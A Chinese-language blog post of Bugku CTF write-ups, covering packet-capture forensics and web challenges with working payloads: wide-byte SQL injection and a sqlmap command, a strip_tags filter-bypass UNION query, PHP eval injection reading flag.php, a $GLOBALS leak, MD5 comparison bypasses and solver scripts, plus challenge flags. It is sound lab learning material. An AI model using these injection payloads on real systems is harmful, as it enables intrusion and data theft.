---
layout: post
title: "bugku ctf writeup1"
date: 2018-03-07 22：40
categories: jekyll update
---

## 前言
&emsp;&emsp;此篇文章记录bugku中作者觉得比较`有价值`的writeup。

## MISC
### linux基础问题
&emsp;&emsp;将<a href="http://120.24.86.145:8002/misc/1.tar.gz">压缩包</a>下载后可以发现一个flag文件，拿到`010Editor`查找flag却没有任何发现，后来使用`winhex`查找flag，发现了flag.txt，但这并没有什么用，所以再次查找key，此时就能找到flag。
flag：key{feb81d3834e2423c9903f4755464060b}
<div align="center">
    <img src="/images/posts/bugku/1.png" >  
</div>

### 中国菜刀
&emsp;&emsp;下载压缩文件后可以发现是`wireshark的捕获包`，使用wireshark分析，追踪TCP流可以发现有一段流比较奇怪。
<div align="center">
    <img src="/images/posts/bugku/2.png" >  
</div>
&emsp;&emsp;将传输的数据拿去进行base64解密可以得知这个流是读取flag的数据流。
<div align="center">
    <img src="/images/posts/bugku/3.png" >  
</div>
&emsp;&emsp;所以将这个蓝色部分的数据提取出来
<div align="center">
    <img src="/images/posts/bugku/4.png" >  
</div>
&emsp;&emsp;调整数据流后再选择解码类型。
<div align="center">
    <img src="/images/posts/bugku/5.png" >  
</div>
&emsp;&emsp;所以flag：key{8769fe393f2b998fa6a11afe2bfcd65e}

### 这么多数据包
&emsp;&emsp;下载后用wireshark打开，将进度条下拉到`灰色（传输稳定）`的状态，选择一条，然后追踪TCP流，
<div align="center">
    <img src="/images/posts/bugku/6.png" >  
</div>
<div align="center">
    <img src="/images/posts/bugku/7.png" width="70%" />  
</div>
&emsp;&emsp;调节流，在1735就有发现，将那串字符进行base64解码后可以发现。
<div align="center">
    <img src="/images/posts/bugku/8.png" >  
</div>
<div align="center">
    <img src="/images/posts/bugku/9.png" >  
</div>
&emsp;&emsp;所以flag：CCTF{do_you_like_sniffer}

### Linux2
&emsp;&emsp;题目描述：
```
给你点提示吧：key的格式是KEY{}
题目地址：链接: http://pan.baidu.com/s/1skJ6t7R 密码: s7jy
```
&emsp;&emsp;将文件下载后使用binwalk、foremost可以分离出一个看似是flag的图片，但提交却是错误。无奈只能换种思路，自己想了挺久没想出来，后来查了下writeup才发现正确的解题方式：`使用strings brave分析文件`。
<div align="center">
    <img src="/images/posts/bugku/10.png" >  
</div>
<div align="center">
    <img src="/images/posts/bugku/11.png" >  
</div>
&emsp;&emsp;所以flag：KEY{24f3627a86fc740a7f36ee2c7a1c124a}

## WEB
### sql注入
&emsp;&emsp;题目描述：
<div align="center">
    <img src="/images/posts/bugku/12.png" >  
</div>
&emsp;&emsp;在测试的时候发现不管'还是"都无法判断是否存在注入，查看源代码发现页面使用`gb2312`，所以考虑`宽字节注入`，。
<div align="center">
    <img src="/images/posts/bugku/13.png" >  
</div>
```
POC: id=1%df%27 and 1=1 -- +
```
<div align="center">
    <img src="/images/posts/bugku/14.png" >  
</div>
&emsp;&emsp;但在查询string的值时发生如下错误
<div align="center">
    <img src="/images/posts/bugku/15.png" >  
</div>
&emsp;&emsp;尝试将`key`使用反引号包围，即\`key\`。最终得到flag。
<div align="center">
    <img src="/images/posts/bugku/16.png" >  
</div>
&emsp;&emsp;所以flag：KEY{54f3320dc261f313ba712eb3f13a1f6d}

&emsp;&emsp;后来查阅了资源，`sqlmap进行宽字节注入`的payload如下：
```shell
python2 sqlmap.py -u http://103.238.227.13:10083/?id=1%df%27
```

### 域名解析
&emsp;&emsp;题目描述：
>听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag

&emsp;&emsp;windows下修改本地hosts解析的方法是修改`C:\Windows\System32\drivers\etc`下的hosts文件，注意要用管理员身份修改。
<div align="center">
    <img src="/images/posts/bugku/17.png" >  
</div>
&emsp;&emsp;在里面增加一条记录即可，然后访问flag.bugku.com，即可得到flag。
<div align="center">
    <img src="/images/posts/bugku/18.png" >  
</div>

### SQL注入测试
&emsp;&emsp;题目描述：
>访问参数为：?id=x
>查找表为key的数据表，id=1值hash字段值

&emsp;&emsp;过滤代码
```php
//过滤sql
$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');
foreach ($array as $value)
{
    if (substr_count($id, $value) > 0)
    {
        exit('包含敏感关键字！'.$value);
    }
}

//xss过滤
$id = strip_tags($id);

$query = "SELECT * FROM temp WHERE id={$id} LIMIT 1";
```
&emsp;&emsp;可以看出过滤得很严格，但致命的缺陷是`$id = strip_tags($id);`，它给了我们一丝可乘之机。`strip_tags`可以过滤掉html、xml、php中的标签，比如将a`<`a`>`nd过滤成and。

&emsp;&emsp;所以payload：
```
http://103.238.227.13:10087/?id=-1 u<a>nion se<a>lect hash,2 f<a>rom `key` where id=1 -- +
```
&emsp;&emsp;flag： KEY{c3d3c17b4ca7f791f85e#$1cc72af274af4adef}

### 本地包含
&emsp;&emsp;题目描述：
```php
echo '2333，不只是本地文件包含哦~'; <?php 
    include "waf.php"; 
    include "flag.php"; 
    $a = @$_REQUEST['hello']; 
    eval( "var_dump($a);"); 
    show_source(__FILE__); 
?>
```
&emsp;&emsp;这里一开始踏进了一个坑，测试的时候使用了`1)";echo 111;//`，但没有任何回显。
<div align="center">
    <img src="/images/posts/bugku/19.png" >  
</div>
&emsp;&emsp;看了writeup后才发现`"`是多余的。
<div align="center">
    <img src="/images/posts/bugku/20.png" >  
</div>
&emsp;&emsp;在`eval()`中可以使用`print_r(file("xxx"))`的形式读取文件，所以payload就是：`1);print_r(file("flag.php"));//`
<div align="center">
    <img src="/images/posts/bugku/21.png" >  
</div>

### 变量1
&emsp;&emsp;题目描述：
```php
flag In the variable ! <?php  

error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
?>
```
&emsp;&emsp;这里由于正则只匹配字母，不允许有`;`之类的符号出现，所以用上一道题的payload是没法获得flag的。但好在存在`$$args`，可以为我们打开另一道窗。

&emsp;&emsp;这里介绍一个php中的特殊变量: `$GLOBALS`，它的作用如下：
<div align="center">
    <img src="/images/posts/bugku/22.png" >  
</div>
&emsp;&emsp;所以我们可以利用`$GLOBALS`输出flag的值，故payload：`http://120.24.86.145:8004/index1.php?args=GLOBALS`。
<div align="center">
    <img src="/images/posts/bugku/23.png" >  
</div>

### 备份是个好习惯
&emsp;&emsp;题目描述：
>http://120.24.86.145:8002/web16/
>听说备份是个好习惯

&emsp;&emsp;访问index.php.bak可以下载源码
```php
<?php
include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');
$str = substr($str,1);
$str = str_replace('key','',$str);
parse_str($str);
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
?>
```

&emsp;&emsp;这里说下`$_SERVER['REQUEST_URI']`和`parse_str($str)`的作用，
```php
访问：http://localhost/aaa/?p=222
$_SERVER['REQUEST_URI']  = "/aaa/?p=222";

<?php
parse_str("name=Bill&age=60");
echo $name."<br>";  // Bill
echo $age;  // 60
?>
```

&emsp;&emsp;接下来介绍两个绕过md5检查的方法
* **一：使用数组的形式绕过**
&emsp;&emsp;&emsp;&emsp;因为MD5不能处理数组，MD5在对数组进行加密时会返回`false（null?）`，`false==false`无疑是成立的，所以可以构造`?a[]=1&b[]=2`之类的方法绕过检查。所以，payload1如下：
<div align="center">
    <img src="/images/posts/bugku/24.png" >  
</div>
* **二：找到两个md5加密后相同的值**
&emsp;&emsp;&emsp;&emsp;这个要考积累，这里我找到了两个值。`?key1=QNKCDZO&key2=240610708`。
<div align="center">
    <img src="/images/posts/bugku/25.png" >  
</div>

### 秋名山老司机
&emsp;&emsp;题目描述：
>亲请在2s内计算老司机的车速是多少
>1741242492-1033554030-217864531-2107975482+1148641444-1741096300+1743626951*378263735*21637778+861571530+717037212=?;

&emsp;&emsp;附上python脚本如下，这里重要的函数是`eval()`：
```python
# -*- coding:utf-8 -*-

import requests
from bs4 import BeautifulSoup
url='http://120.24.86.145:8002/qiumingshan/'
r=requests.session()
requestpage = r.get(url)
soup = BeautifulSoup(requestpage.content, 'lxml')
ans=soup.select('div')[0].get_text()[:-3]
print(ans)
post=eval(ans)#计算表达式的值
data={'value':post}#构造post的data部分
flag=r.post(url,data=data)
print(flag.text)
```

### 速度要快
&emsp;&emsp;题目描述：
<div align="center">
    <img src="/images/posts/bugku/26.png" >  
</div>
&emsp;&emsp;要注意的是`margin`，这是一个数字，这也是后面的一个小坑。

&emsp;&emsp;用burpsuite抓包可以发现，http的头部有flag，并且一看就是base64编码过的。
<div align="center">
    <img src="/images/posts/bugku/27.png" >  
</div>
&emsp;&emsp;最后的脚本：
```python
# -*- coding:utf-8 -*-
import requests
import base64

url = 'http://120.24.86.145:8002/web6/'
r = requests.session()
html = r.get(url)
bs = html.headers['flag']
key = base64.b64decode(bs)
key = str(key, encoding='utf-8')
print(key)
key = key.split(' ')[1]
key = str(base64.b64decode(key), encoding='utf-8')
print(key)
data = {'margin':key}
html = r.post(url, data)
print(html.text)
```
&emsp;&emsp;要注意的是，后面的一串还要进行一次base64解码才能得到`数字`。
<div align="center">
    <img src="/images/posts/bugku/27.png" >  
</div>